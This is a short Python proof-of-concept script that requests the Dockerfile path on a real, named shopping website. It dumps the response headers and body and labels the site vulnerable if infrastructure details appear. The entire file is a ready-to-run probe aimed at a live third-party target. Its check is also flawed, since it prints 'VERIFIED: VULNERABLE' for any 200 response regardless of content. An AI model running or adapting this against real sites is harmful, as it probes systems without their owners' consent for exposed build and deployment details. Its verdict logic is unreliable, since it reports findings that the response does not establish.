import requests
import time

def exploit_vulnerability(url):
    start_time = time.time()
    try:
        response = requests.get(url)
    except Exception as e:
        print(f"Error: {str(e)}")
        return

    print(f"Headers: {str(response.headers)}")
    print(f"Timing: {time.time() - start_time:.4f} seconds")
    print(f"Status Code: {response.status_code}")
    print(f"Content: {response.text}")

    if "Dockerfile" in response.text:
        print("Content Type: text/plain")
        print("Infra Details Leaked")
    else:
        print("Content Type Not Found or Infra Details Not Leaked")

    if response.status_code == 200:
        print("VERIFIED: VULNERABLE")
    else:
        print("NOT VERIFIED")

if __name__ == "__main__":
    exploit_vulnerability("https://www.meesho.com/Dockerfile")